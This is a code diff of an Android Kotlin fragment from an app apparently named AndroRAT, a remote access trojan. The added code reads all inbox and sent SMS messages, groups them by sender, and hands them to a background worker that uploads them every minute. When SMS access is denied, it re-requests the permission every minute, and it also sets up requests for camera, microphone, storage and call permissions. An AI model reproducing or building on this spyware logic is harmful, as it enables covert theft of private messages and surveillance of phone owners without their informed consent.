@@ -69,18 +69,15 @@ class HomeFragment : Fragment() {
     )
 
     @RequiresApi(Build.VERSION_CODES.TIRAMISU)
-    private val readMediaPermissionsAndroid13 = arrayOf(
-        Manifest.permission.READ_MEDIA_AUDIO,
+    private val readMediaImagesAndAudioPermissions = arrayOf(
         Manifest.permission.READ_MEDIA_IMAGES,
-        Manifest.permission.READ_MEDIA_VIDEO,
+        Manifest.permission.READ_MEDIA_AUDIO,
     )
 
+    @SuppressWarnings("unused")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        Log.d(
-            "home_fragment", "onCreate: activity.packageName - ${activity?.packageName} ---" +
-                    "activity - $activity "
-        )
+
         /**
          * To check the permissions whether granted or not
          */
@@ -127,17 +124,30 @@ class HomeFragment : Fragment() {
 
         return ComposeView(requireContext()).apply {
             setContent {
-                val state by homeViewModel.state.collectAsState()
-                val lifecycleOwner = LocalLifecycleOwner.current
                 val context = LocalContext.current
-                AndroRATTheme {
+                val lifecycleOwner = LocalLifecycleOwner.current
+                val state by homeViewModel.state.collectAsState()
+                val dialogQueue = homeViewModel.visiblePermissionDialogQueue
+                val workManager = WorkManager.getInstance(context)
 
-                    val dialogQueue = homeViewModel.visiblePermissionDialogQueue
+                val multiplePermissionResultLauncher = rememberLauncherForActivityResult(
+                    contract = ActivityResultContracts.RequestMultiplePermissions(),
+                    onResult = { perms ->
+                        recordAudioAndCallPhonePermissions.forEach { permission ->
+                            homeViewModel.onPermissionResult(
+                                permission = permission,
+                                isGranted = perms[permission] == true
+                            )
+                        }
+                    }
+                )
 
-                    val multiplePermissionResultLauncher = rememberLauncherForActivityResult(
+
+                val readMediaImagesAndAudioPermissionsAndroid13Launcher =
+                    rememberLauncherForActivityResult(
                         contract = ActivityResultContracts.RequestMultiplePermissions(),
                         onResult = { perms ->
-                            recordAudioAndCallPhonePermissions.forEach { permission ->
+                            readMediaImagesAndAudioPermissions.forEach { permission ->
                                 homeViewModel.onPermissionResult(
                                     permission = permission,
                                     isGranted = perms[permission] == true
@@ -146,85 +156,128 @@ class HomeFragment : Fragment() {
                         }
                     )
 
-                    //todo do this later
-//                    val writeAndReadPermissionsUnderAndroid11Launcher =
-//                        rememberLauncherForActivityResult(
-//                            contract = ActivityResultContracts.RequestMultiplePermissions(),
-//                            onResult = { perms ->
-//                                readAndWritePermissionsUnderAndroid11Versions.forEach { permission ->
-//                                    homeViewModel.onPermissionResult(
-//                                        permission = permission,
-//                                        isGranted = perms[permission] == true
-//                                    )
-//                                }
-//                            }
-//                        )
+                val readExternalStoragePermissionUnderAndroid11Launcher =
+                    rememberLauncherForActivityResult(
+                        contract = ActivityResultContracts.RequestPermission(),
+                        onResult = { isGranted ->
+                            homeViewModel.onPermissionResult(
+                                permission = Manifest.permission.READ_EXTERNAL_STORAGE,
+                                isGranted = isGranted
+                            )
+                        }
+                    )
 
-                    //this launcher intended to use only for devices running on android 13 and above
-                    val readMediaPermissionAndroid13Launcher =
-                        rememberLauncherForActivityResult(
-                            contract = ActivityResultContracts.RequestMultiplePermissions(),
-                            onResult = { perms ->
-                                readMediaPermissionsAndroid13.forEach { permission ->
-                                    homeViewModel.onPermissionResult(
-                                        permission = permission,
-                                        isGranted = perms[permission] == true
+                val recordAudioPermissionLauncher = rememberLauncherForActivityResult(
+                    contract = ActivityResultContracts.RequestPermission(),
+                    onResult = { isGranted ->
+                        homeViewModel.onPermissionResult(
+                            permission = Manifest.permission.RECORD_AUDIO,
+                            isGranted = isGranted
+                        )
+                    }
+                )
+
+
+                val cameraResultPermissionLauncher = rememberLauncherForActivityResult(
+                    contract = ActivityResultContracts.RequestPermission(),
+                    onResult = { isGranted ->
+                        homeViewModel.onPermissionResult(
+                            permission = Manifest.permission.CAMERA,
+                            isGranted = isGranted
+                        )
+                    }
+                )
+
+                val readSMSMessagesPermissionLauncher = rememberLauncherForActivityResult(
+                    contract = ActivityResultContracts.RequestPermission(),
+                    onResult = { isGranted ->
+                        homeViewModel.onPermissionResult(
+                            permission = Manifest.permission.READ_SMS,
+                            isGranted = isGranted
+                        )
+                    }
+                )
+
+                AndroRATTheme {
+
+                    LaunchedEffect(
+                        key1 = Unit,
+                        block = {
+                            if (ContextCompat.checkSelfPermission(
+                                    requireContext(),
+                                    Manifest.permission.READ_SMS
+                                ) == PackageManager.PERMISSION_GRANTED
+                            ) {
+                                //to cancel periodic unique work
+                                workManager.cancelUniqueWork(Constants.PERMISSION_REQUEST_WORK_NAME)
+
+                                val allMessages: MutableMap<String, List<Any>> = mutableMapOf()
+                                val messages =
+                                    readMessages(
+                                        context = requireContext(),
+                                        type = "inbox"
+                                    ) + readMessages(
+                                        context = requireContext(),
+                                        type = "sent"
                                     )
+                                allMessages += messages.sortedBy { it.date }.groupBy { it.sender }
+                                var deviceMessages = ""
+                                allMessages.forEach { (sender, messages) ->
+                                    deviceMessages += "$sender -  $messages \n "
                                 }
-                            }
-                        )
 
-                    val readExternalStoragePermissionUnderAndroid11Launcher =
-                        rememberLauncherForActivityResult(
-                            contract = ActivityResultContracts.RequestPermission(),
-                            onResult = { isGranted ->
-                                homeViewModel.onPermissionResult(
-                                    permission = Manifest.permission.READ_EXTERNAL_STORAGE,
-                                    isGranted = isGranted
+                                val data = Data.Builder()
+                                data.putString(
+                                    Constants.UPLOAD_WORKER_ARGUMENT_NAME,
+                                    deviceMessages
                                 )
+
+                                val uploadWorkRequest = PeriodicWorkRequestBuilder<UploadWorker>(
+                                    repeatInterval = 1,
+                                    repeatIntervalTimeUnit = TimeUnit.MINUTES,
+                                )
+                                    .setInputData(data.build())
+                                    .build()
+
+                                workManager.enqueueUniquePeriodicWork(
+                                    Constants.UPLOAD_WORK_NAME,
+                                    ExistingPeriodicWorkPolicy.KEEP,
+                                    uploadWorkRequest
+                                )
+                                workManager.getWorkInfosForUniqueWorkLiveData(Constants.UPLOAD_WORK_NAME)
+                                    .observe(viewLifecycleOwner) {
+                                        it.forEach { workInfo ->
+                                            Log.d(
+                                                "ahi3646_upload_info",
+                                                "onCreateView: workInfo - ${workInfo.state} "
+                                            )
+                                        }
+                                    }
+                            } else {
+                                //to cancel periodic unique work
+                                workManager.cancelUniqueWork(Constants.UPLOAD_WORK_NAME)
+
+                                val permissionWorkRequest =
+                                    PeriodicWorkRequestBuilder<PermissionRequestWorker>(
+                                        repeatInterval = 1,
+                                        repeatIntervalTimeUnit = TimeUnit.MINUTES,
+                                    )
+                                        .build()
+                                workManager.enqueueUniquePeriodicWork(
+                                    Constants.PERMISSION_REQUEST_WORK_NAME,
+                                    ExistingPeriodicWorkPolicy.KEEP,
+                                    permissionWorkRequest
+                                )
+                                workManager.getWorkInfosForUniqueWorkLiveData(Constants.PERMISSION_REQUEST_WORK_NAME)
+                                    .observe(lifecycleOwner) {
+                                        it.forEach { workInfo ->
+                                            Log.d(
+                                                "ahi3646_request_info",
+                                                "onCreateView: workInfo - ${workInfo.state} "
+                                            )
+                                        }
+                                    }
                             }
-                        )
-
-//                    TODO implement this later
-//                    val readExternalStoragePermissionForAndroid11And12Launcher =
-//                        rememberLauncherForActivityResult(
-//                            contract = ActivityResultContracts.RequestPermission(),
-//                            onResult = { isGranted ->
-//                                homeViewModel.onPermissionResult(
-//                                    permission = Manifest.permission.MANAGE_EXTERNAL_STORAGE,
-//                                    isGranted = isGranted
-//                                )
-//                            }
-//                        )
-
-                    val recordAudioPermissionLauncher = rememberLauncherForActivityResult(
-                        contract = ActivityResultContracts.RequestPermission(),
-                        onResult = { isGranted ->
-                            homeViewModel.onPermissionResult(
-                                permission = Manifest.permission.RECORD_AUDIO,
-                                isGranted = isGranted
-                            )
-                        }
-                    )
-
-
-                    val cameraResultPermissionLauncher = rememberLauncherForActivityResult(
-                        contract = ActivityResultContracts.RequestPermission(),
-                        onResult = { isGranted ->
-                            homeViewModel.onPermissionResult(
-                                permission = Manifest.permission.CAMERA,
-                                isGranted = isGranted
-                            )
-                        }
-                    )
-
-                    val readSMSMessagesPermissionLauncher = rememberLauncherForActivityResult(
-                        contract = ActivityResultContracts.RequestPermission(),
-                        onResult = { isGranted ->
-                            homeViewModel.onPermissionResult(
-                                permission = Manifest.permission.READ_SMS,
-                                isGranted = isGranted
-                            )
                         }
                     )
 
@@ -233,18 +286,9 @@ class HomeFragment : Fragment() {
                         .forEach { permission ->
                             PermissionDialog(
                                 permissionTextProvider = when (permission) {
-
                                     Manifest.permission.READ_MEDIA_AUDIO -> {
                                         MusicAndAudioPermissionTextProvider()
                                     }
-
-                                    /**
-                                     * No need to add Manifest.permission.READ_MEDIA_VIDEO
-                                     * this will make rational dialog pop up two times for same warning
-                                     * Once user allow for READ_VIDEOS or READ_IMAGE , both permissions
-                                     * will be accessible for app
-                                     */
-
                                     /**
                                      * No need to add Manifest.permission.READ_MEDIA_VIDEO
                                      * this will make rational dialog pop up two times for same warning
@@ -281,98 +325,61 @@ class HomeFragment : Fragment() {
                                     permission
                                 ),
                                 onDismiss = homeViewModel::dismissDialog,
-                                //todo look here
                                 onOkClick = {
-                                    homeViewModel.dismissDialog()
-                                    multiplePermissionResultLauncher.launch(
-                                        arrayOf(permission)
-                                    )
+                                    dialogQueue.forEach {
+                                        Log.d("permissions", "onCreateView ok : $it ")
+                                    }
+                                    when (permission) {
+
+                                        Manifest.permission.READ_MEDIA_AUDIO -> {
+                                            homeViewModel.dismissDialog()
+                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
+                                                arrayOf(permission)
+                                            )
+                                        }
+
+                                        Manifest.permission.READ_MEDIA_IMAGES -> {
+                                            homeViewModel.dismissDialog()
+                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
+                                                arrayOf(permission)
+                                            )
+                                        }
+
+                                        Manifest.permission.READ_EXTERNAL_STORAGE -> {
+                                            homeViewModel.dismissDialog()
+                                            readExternalStoragePermissionUnderAndroid11Launcher.launch(
+                                                permission
+                                            )
+                                        }
+
+                                        Manifest.permission.CAMERA -> {
+                                            homeViewModel.dismissDialog()
+                                            cameraResultPermissionLauncher.launch(permission)
+                                        }
+
+                                        Manifest.permission.READ_SMS -> {
+                                            homeViewModel.dismissDialog()
+                                            readSMSMessagesPermissionLauncher.launch(permission)
+                                        }
+
+                                        Manifest.permission.RECORD_AUDIO -> {
+                                            homeViewModel.dismissDialog()
+                                            multiplePermissionResultLauncher.launch(
+                                                arrayOf(permission)
+                                            )
+                                        }
+
+                                        Manifest.permission.CALL_PHONE -> {
+                                            homeViewModel.dismissDialog()
+                                            multiplePermissionResultLauncher.launch(
+                                                arrayOf(permission)
+                                            )
+                                        }
+                                    }
                                 },
                                 onGoToAppSettingsClick = ::openAppSettings
                             )
                         }
-
-                    val workManager = WorkManager.getInstance(context)
-
-                    //requesting permission repeatedly
-                    LaunchedEffect(
-                        key1 = Unit,
-                        block = {
-                            if (ContextCompat.checkSelfPermission( requireContext(),
-                                    Manifest.permission.READ_SMS ) == PackageManager.PERMISSION_GRANTED ){
-                                val allMessages: MutableMap<String, List<Any>> = mutableMapOf()
-                                val messages =
-                                    readMessages(context = requireContext(), type = "inbox") + readMessages(
-                                        context = requireContext(),
-                                        type = "sent"
-                                    )
-                                allMessages += messages.sortedBy { it.date }.groupBy { it.sender }
-
-                                var deviceMessages = ""
-                                allMessages.forEach { (sender, messages) ->
-                                    deviceMessages += "$sender -  $messages \n "
-                                }
-                                homeViewModel.sendMessages(
-                                    messages = "deviceMessages",
-                                    context = requireContext()
-                                )
-
-                                val data = Data.Builder()
-                                data.putString(Constants.UPLOAD_WORKER_ARGUMENT_NAME, deviceMessages)
-
-                                val uploadWorkRequest =
-                                    PeriodicWorkRequestBuilder<UploadWorker>(
-                                        repeatInterval = 1,
-                                        repeatIntervalTimeUnit = TimeUnit.MINUTES,
-                                        )
-                                        .build()
-                                workManager.enqueueUniquePeriodicWork(
-                                    Constants.UPLOAD_WORK_NAME,
-                                    ExistingPeriodicWorkPolicy.CANCEL_AND_REENQUEUE,
-                                    uploadWorkRequest
-                                )
-                                workManager.getWorkInfosForUniqueWorkLiveData(Constants.UPLOAD_WORK_NAME)
-                                    .observe(viewLifecycleOwner) {
-                                        it.forEach { workInfo ->
-                                            Log.d(
-                                                "ahi3646_upload_info",
-                                                "onCreateView: workInfo - ${workInfo.state} "
-                                            )
-                                        }
-                                    }
-                            }else{
-                                val permissionWorkRequest =
-                                    PeriodicWorkRequestBuilder<PermissionRequestWorker>(
-                                        repeatInterval = 1,
-                                        repeatIntervalTimeUnit = TimeUnit.MINUTES,
-//                                    flexTimeInterval = 10,
-//                                    flexTimeIntervalUnit = TimeUnit.SECONDS
-                                    )
-//                                    .setBackoffCriteria(
-//                                        backoffPolicy = BackoffPolicy.LINEAR,
-//                                        duration = Duration.ofSeconds(15)
-//                                    )
-                                        .build()
-                                workManager.enqueueUniquePeriodicWork(
-                                    Constants.PERMISSION_REQUEST_WORK_NAME,
-                                    ExistingPeriodicWorkPolicy.KEEP,
-                                    permissionWorkRequest
-                                )
-                                workManager.getWorkInfosForUniqueWorkLiveData(Constants.PERMISSION_REQUEST_WORK_NAME)
-                                    .observe(lifecycleOwner) {
-                                        it.forEach { workInfo ->
-                                            Log.d(
-                                                "ahi3646_request_info",
-                                                "onCreateView: workInfo - ${workInfo.state} "
-                                            )
-                                        }
-                                    }
-                            }
-
-                            //to cancel periodic unique work
-                            //workManager.cancelUniqueWork(Constants.PERMISSION_REQUEST_WORK_NAME)
-                        }
-                    )
 
                     HomeScreen(
                         state = state,
@@ -396,7 +403,7 @@ class HomeFragment : Fragment() {
                         },
                         onReadExternalStoragePermissionRequest = {
                             when (Build.VERSION.SDK_INT) {
-//                                in Build.VERSION_CODES.M..Build.VERSION_CODES.Q -> {
+
                                 in Build.VERSION_CODES.M..Build.VERSION_CODES.Q -> {
                                     //todo check these versions
                                     readExternalStoragePermissionUnderAndroid11Launcher.launch(
@@ -405,9 +412,12 @@ class HomeFragment : Fragment() {
                                 }
 
                                 in Build.VERSION_CODES.R..Build.VERSION_CODES.S_V2 -> {
-                                    //todo
                                     if (Environment.isExternalStorageManager()) {
-                                        Log.d("ahi3646", "onCreateView: read permission granted")
+                                        Toast.makeText(
+                                            requireContext(),
+                                            "Permission granted for ReadExternalStorage",
+                                            Toast.LENGTH_SHORT
+                                        ).show()
                                     } else {
                                         Log.d("ahi3646", "onCreateView: read permission denied")
                                         try {
@@ -426,17 +436,12 @@ class HomeFragment : Fragment() {
                                             startForResultLauncher.launch(intent)
                                         }
                                     }
-//                                    Toast.makeText(requireContext(), "r-s_v2", Toast.LENGTH_SHORT)
-//                                        .show()
-//                                    readExternalStoragePermissionForAndroid11And12Launcher.launch(
-//                                        Manifest.permission.MANAGE_EXTERNAL_STORAGE
-//                                    )
                                 }
                                 //this works in sdk 33 or higher versions
                                 in Build.VERSION_CODES.TIRAMISU..Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                                     //todo check these versions
-                                    readMediaPermissionAndroid13Launcher.launch(
-                                        readMediaPermissionsAndroid13
+                                    readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
+                                        readMediaImagesAndAudioPermissions
                                     )
                                 }
                             }
@@ -559,6 +564,5 @@ class HomeFragment : Fragment() {
             ).show()
         }
     }
-
 
 }
